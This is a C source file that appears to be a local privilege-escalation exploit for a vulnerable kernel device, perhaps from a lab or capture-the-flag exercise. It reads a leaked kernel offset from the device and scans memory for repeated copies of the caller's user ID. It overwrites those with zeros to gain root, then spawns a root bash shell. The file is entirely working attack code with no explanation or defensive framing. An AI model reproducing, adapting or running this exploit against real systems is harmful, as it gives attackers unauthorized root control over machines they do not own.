#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <unistd.h>

#define TRYREAD_SUCCESS 0
#define TRYREAD_KILLED 1
#define TRYREAD_FAILED 2
#define TRYREAD_FAULTED 3
#define ERROR_IMPROPER_USAGE 4
#define ERROR_FAILED_TO_OPEN 5
#define ERROR_FAILED_TO_READ_LEAK 6
#define ERROR_CREATING_PIPE 7
#define ERROR_FORKING 8
#define ERROR_WAITING_ON_CHILD_PROCESS 9
#define ERROR_READING_FROM_CHILD_PIPE 10

int fork_n_read(off_t off, uid_t *p, int fd);

int main(int argc, char *argv[])
{
    int   num                      = 0;
    int   fd                       = -1;
    off_t off                      = 0;
    off_t last_print               = 1;
    uid_t readuid                  = -1;
    uid_t myuid                    = -1;
    int   resp                     = 0;
    char  zeros[sizeof(uid_t) * 8] = {0};
    long  leaked_offset            = 0;

    if (argc < 2)
    {
        printf("Usage: %s /path/to/vlndevice\n", argv[0]);
        exit(ERROR_IMPROPER_USAGE);
    }

    myuid = getuid();
    printf("Looking for UID %u\n", myuid);

    fd = open(argv[1], O_RDWR);
    if (fd == -1)
    {
        perror("open");
        exit(ERROR_FAILED_TO_OPEN);
    }

    lseek(fd, 8, SEEK_SET);
    if (read(fd, &leaked_offset, sizeof(leaked_offset)) == -1)
    {
        printf("Failed to read leaked offset\n");
        perror("read");
        exit(ERROR_FAILED_TO_READ_LEAK);
    }

    off        = (leaked_offset | 0xfffff) + 1;
    last_print = ~off;

    // Search backward in memory for 8 copies of our uid in a row
    while (off > leaked_offset)
    {
        while (off > leaked_offset)
        {
            off -= sizeof(uid_t);

            resp = fork_n_read(off, &readuid, fd);
            if (resp == TRYREAD_FAILED)
            {
                printf("Failed to read at offset 0x%lx\n", off);
                exit(resp);
            }
            else if (resp == TRYREAD_FAULTED)
            {
                // Round down
                printf("Died norm @ 0x%lx\n", off);
                off = (off & (~0xfff));
                num = 0;
                continue;
            }
            else if (resp == TRYREAD_KILLED)
            {
                // Died hard!
                printf("Died bad @ 0x%lx\n", off);
                off = (off & (~0xfff));
                num = 0;
                continue;
            }

            if ((last_print & (~0xffff)) != (off & (~0xffff)))
            {
                printf("Searching 0x%016lx\n", off + sizeof(uid_t));
                last_print = off;
            }

            if (readuid == myuid)
            {
                printf("  Found one instance at off 0x%016lx\n", off);
                num += 1;
            }
            else
            {
                num = 0;
            }

            if (num >= 8)
            {
                printf("Found a bunch of %ds at 0x%lx\n", myuid, off);
                break;
            }
        }

        printf("Writing 0s\n");
        lseek(fd, off, SEEK_SET);
        write(fd, zeros, sizeof(zeros));

        if (getuid() == 0)
        {
            printf("Got root, spawning shell\n");
            system("/bin/bash");
            break;
        }
        else
        {
            printf("Not root, continuing\n");
        }
    }

    return 0;
}

int fork_n_read(off_t off, uid_t *p, int fd)
{
    pid_t child     = 0;
    int   pipefd[2] = {0};
    int   wstatus   = 0;
    int   amt       = 0;
    int   ret       = 0;

    if (pipe2(pipefd, O_NONBLOCK | O_DIRECT))
    {
        perror("pipe");
        exit(ERROR_CREATING_PIPE);
    }

    child = fork();
    if (child == -1)
    {
        perror("fork");
        exit(ERROR_FORKING);
    }

    // Child process
    if (child == 0)
    {
        // Close read end
        close(pipefd[0]);

        // Try read
        lseek(fd, off, SEEK_SET);
        if (read(fd, p, sizeof(uid_t)) == -1)
        {
            if (errno != EFAULT)
            {
                exit(TRYREAD_FAILED);
            }

            // Got a page fault, bad page
            exit(TRYREAD_FAULTED);
        }

        // Write out uid in pipe
        write(pipefd[1], p, sizeof(uid_t));
        exit(TRYREAD_SUCCESS);
    }

    // Parent process
    // Close write end of the pipe
    close(pipefd[1]);

    // Wait on child
    if (waitpid(child, &wstatus, 0) == -1)
    {
        perror("waitpid");
        exit(ERROR_WAITING_ON_CHILD_PROCESS);
    }

    // Set the return value
    if (!WIFEXITED(wstatus))
    {
        // Process was killed?
        close(pipefd[0]);
        return TRYREAD_KILLED;
    }

    ret = WEXITSTATUS(wstatus);

    if (ret == TRYREAD_SUCCESS)
    {
        amt = read(pipefd[0], p, sizeof(uid_t));
        if (amt != sizeof(uid_t))
        {
            printf("%d\n", amt);
            perror("read from pipe");
            exit(ERROR_READING_FROM_CHILD_PIPE);
        }
    }

    close(pipefd[0]);

    return ret;
}
